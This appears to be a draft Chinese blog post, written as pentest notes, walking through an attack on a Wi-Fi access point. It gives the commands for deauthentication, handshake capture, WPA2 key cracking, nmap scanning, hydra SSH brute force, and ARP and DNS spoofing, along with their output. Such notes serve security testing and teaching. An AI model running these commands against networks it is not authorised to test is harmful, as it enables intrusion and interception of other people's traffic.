---
title: "WIFI PENTEST"
date: "2025-01-14T02:16:00.000Z"
lastmod: "2025-02-06T07:01:00.000Z"
draft: true
featuredImage: "https://www.notion.so/images/page-cover/woodcuts_14.jpg"
series: []
tags:
  - "WIFI"
  - "Pentest"
categories:
  - "网络安全"
authors:
  - "Drennon Margie"
NOTION_METADATA:
  object: "page"
  id: "aee95799-3411-4666-9dce-09641ae150c7"
  created_time: "2025-01-14T02:16:00.000Z"
  last_edited_time: "2025-02-06T07:01:00.000Z"
  created_by:
    object: "user"
    id: "178d872b-594c-8172-aca1-00024d90b8f5"
  last_edited_by:
    object: "user"
    id: "178d872b-594c-8172-aca1-00024d90b8f5"
  cover:
    type: "external"
    external:
      url: "https://www.notion.so/images/page-cover/woodcuts_14.jpg"
  icon:
    type: "emoji"
    emoji: "📶"
  parent:
    type: "database_id"
    database_id: "19152bdf-d31a-8124-9a5a-d4550863a1d2"
  archived: false
  in_trash: false
  properties:
    series:
      id: "B%3C%3FS"
      type: "multi_select"
      multi_select: []
    draft:
      id: "JiWU"
      type: "checkbox"
      checkbox: true
    authors:
      id: "bK%3B%5B"
      type: "people"
      people: []
    custom-front-matter:
      id: "c~kA"
      type: "rich_text"
      rich_text: []
    tags:
      id: "jw%7CC"
      type: "multi_select"
      multi_select:
        - id: "3816e438-8244-4ddc-98c2-18191b73c633"
          name: "WIFI"
          color: "red"
        - id: "d375d5ae-0916-4826-a965-ee66d1a417e2"
          name: "Pentest"
          color: "orange"
    categories:
      id: "nbY%3F"
      type: "multi_select"
      multi_select:
        - id: "94713dd6-904b-4c01-be60-e22f7b310b64"
          name: "网络安全"
          color: "default"
    Last edited time:
      id: "vbGE"
      type: "last_edited_time"
      last_edited_time: "2025-02-06T07:01:00.000Z"
    summary:
      id: "x%3AlD"
      type: "rich_text"
      rich_text: []
    Name:
      id: "title"
      type: "title"
      title:
        - type: "text"
          text:
            content: "WIFI PENTEST"
            link: null
          annotations:
            bold: false
            italic: false
            strikethrough: false
            underline: false
            code: false
            color: "default"
          plain_text: "WIFI PENTEST"
          href: null
  url: "https://www.notion.so/WIFI-PENTEST-aee95799341146669dce09641ae150c7"
  public_url: null
MANAGED_BY_NOTION_HUGO: true

---


# WIFI PENTEST


## 1. 嗅探


扫描整个网络，寻找可疑项（该热点已关闭SSID广播）：


​


![](https://notion-blog-2wg.pages.dev//api?block_id=17b52bdf-d31a-81aa-b05b-d6e69675332c)


​


发送解除认证包：


```shell
sudo aireplay-ng --deauth 10 -a 74:07:7E:ED:7B:8D wlan0 --ignore-negative-one
```


得ESSID和已连接的客户端MAC值：


​


![](https://notion-blog-2wg.pages.dev//api?block_id=17b52bdf-d31a-815e-8fd6-d58966755240)


​


ESSID:HQL00000000


加密方法：WPA2


打开抓包，抓包文件记为handshake：


```shell
sudo airodump-ng -c 6 --bssid 74:07:7E:ED:7B:8D -w handshake wlan0
```


发送解除认证包，使客户端断开连接，重新与AP握手：


​`sudo aireplay-ng --deauth 10 -a 74:07:7E:ED:7B:8D wlan0 --ignore-negative-one`​


此过程中握手包被抓取并记录。


## 2. 弱口令爆破


利用握手包，使用kali自带的字典进行爆破：


```shell
sudo aircrack-ng -w /usr/share/dict/wordlist-probable.txt -b 74:07:7E:ED:7B:8D -e HQL00000000 handshake-01.cap
```


​


![](https://notion-blog-2wg.pages.dev//api?block_id=17b52bdf-d31a-8151-b813-cb0eb8c8617b)


​


## 3. 口令复杂度分析


使用库`zxcvbn`​，


以口令`HomeWifi@2025`​为例，输出为：


```text
密码强度评分（0-4）：4
破解时间估计：
  online_throttling_100_per_hour: centuries
  online_no_throttling_10_per_second: centuries
  offline_slow_hashing_1e4_per_second: 1 year
  offline_fast_hashing_1e10_per_second: 37 seconds
密码分析建议：
  警告:
  无
```


## 4. 内网渗透


### 4.1 扫描在线主机


破解WIFI口令后登入该网络，确认此网段内在线的主机：


```shell
sudo nmap -sn 192.168.10.0/24
# 输出Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-09 14:37 CST
Nmap scan report for 192.168.10.1
Host is up (0.050s latency).MAC Address: 8A:AC:1D:09:AA:CF (Unknown)Nmap scan report for 192.168.10.147
Host is up.
Nmap done: 256 IP addresses (2 hosts up) scanned in 12.24 seconds
```


此时仅两台设备在线，一台为本机，可见AP IP为192.168.10.1。


### 4.2 获取在线设备信息


获取该主机信息：


```shell
sudo nmap -A 192.168.1.101
# 输出Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-09 14:43 CST
Nmap scan report for bogon (192.168.10.1)Host is up (0.37s latency).Not shown: 999 filtered tcp ports (no-response)PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.4 (protocol 2.0)| ssh-hostkey:
|   256 34:03:90:3a:42:00:9d:cb:fa:80:f8:96:85:e3:08:1d (ECDSA)|_  256 ca:bf:15:8d:42:28:5d:10:8c:67:f2:89:c9:b8:65:62 (ED25519)MAC Address: 8A:AC:1D:09:AA:CF (Unknown)Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|switch|storage-misc|media device|load balancer
Running (JUST GUESSING): Linux 3.X|4.X (97%), Netgear embedded (91%), QNAP embedded (91%), Zgemma embedded (89%), Kemp embedded (87%)OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:3.18.24 cpe:/o:linux:linux_kernel:4.14 cpe:/o:linux:linux_kernel:4.4 cpe:/o:linux:linux_kernel:4.9
Aggressive OS guesses: Linux 3.12 - 4.10 (97%), Linux 3.18 (93%), Linux 3.16 (91%), Linux 4.14 (91%), Netgear GS108Tv3, GS110Tv3, or GS308T switch (Linux 3.18.24) (91%), QNAP NAS device (Linux 4.14) (91%), Zgemma H9 TV receiver (Linux 4.4) (89%), Kemp LoadMaster Firmware 7.2 (Linux 4.9) (87%), Rebranded surveillance DVR (Hikvision, Q-SEE, EYEsurv, A1Webcams, Foscam) (87%)No exact OS matches for host (test conditions non-ideal).Network Distance: 1 hop
TRACEROUTEHOP RTT       ADDRESS
1   365.84 ms bogon (192.168.10.1)OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 90.12 seconds
```


可知TBOX的**SSH服务未关闭**。


### 4.3 捕获内网中未加密的数据包


```shell
sudo tcpdump -i wlan0
```


使用wireshark分析


### 4.4 漏洞扫描


此处在线设备为TBOX


```shell
sudo nmap --script vuln 192.168.10.1
# 输出Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-09 14:56 CST
Nmap scan report for 192.168.10.1
Host is up (0.38s latency).Not shown: 999 filtered tcp ports (no-response)PORT   STATE SERVICE
22/tcp open  ssh
MAC Address: 8A:AC:1D:09:AA:CF (Unknown)Nmap done: 1 IP address (1 host up) scanned in 44.26 seconds
```


‍


### 4.5 SSH爆破


```shell
─$ ssh user@192.168.10.1
#输出The authenticity of host '192.168.10.1 (192.168.10.1)' can't be established.ED25519 key fingerprint is SHA256:s9L3hh3ICgQoYvYvJWftPyYLdnH+dRTgALELHxrMkEM.This key is not known by any other names.Are you sure you want to continue connecting (yes/no/[fingerprint])? yes─$ ssh root@192.168.10.1#输出root@192.168.10.1's password:
─$ ssh guest@192.168.10.1
#输出guest@192.168.10.1's password:
```


登录提示说明存在用户名为root，guest的用户有口令，而user用户使用的是非对称密钥：


针对root和guest：


```shell
└─$ hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.10.1
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-01-09 15:27:56
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://192.168.10.1:22/
[STATUS] 100.00 tries/min, 100 tries in 00:01h, 14344301 to do in 2390:44h, 14 active
[STATUS] 109.67 tries/min, 329 tries in 00:03h, 14344072 to do in 2179:58h, 14 active
```


```shell
└─$ hydra -l guest -P /usr/share/wordlists/rockyou.txt ssh://192.168.10.1
```


都无法成功破解。


## 5. 中间人攻击


### 5.1 ARP欺骗


通过 ARP 欺骗，告诉目标设备和网关攻击者是合法通信对方。


### 5.1.1 使用 `Bettercap`​

1. 安装 Bettercap：

	```shell
	sudo apt update
	sudo apt install bettercap
	```

1. 启动 Bettercap：

	```shell
	sudo bettercap -iface wlan0
	```

1. 执行 ARP 欺骗：

	```shell
	net.probe on       # 探测内网设备set arp.spoof.targets 192.168.10.1  # 设置目标设备arp.spoof on       # 开启 ARP 欺骗net.sniff on       # 开启数据嗅探
	```


‍


### 5.1.2 使用 `Ettercap`​

1. 启动 Ettercap：

	```shell
	sudo ettercap -G
	```

1. 选择网络接口（如 wlan0）。
1. 扫描并选择目标：
	- 扫描目标网段（`192.168.10.0/24`​），将目标设备和网关加入攻击列表。
1. 启动 ARP 欺骗：
	- ​`Mitm > ARP Poisoning > Sniff Remote Connections`​

### 5.2 DNS欺骗


通过 DNS 欺骗将目标设备的请求重定向到攻击者指定的地址。


### 5.2.1 使用 Bettercap 的 DNS Spoof 模块

1. 配置 DNS 欺骗：

	```shell
	set dns.spoof.domains example.com  # 替换为你想拦截的域名set dns.spoof.address 192.168.10.1 # 替换为伪造的 IP 地址dns.spoof on
	```

1. 生效后，目标访问 `example.com`​ 会被重定向到攻击者设备。

‍


‍

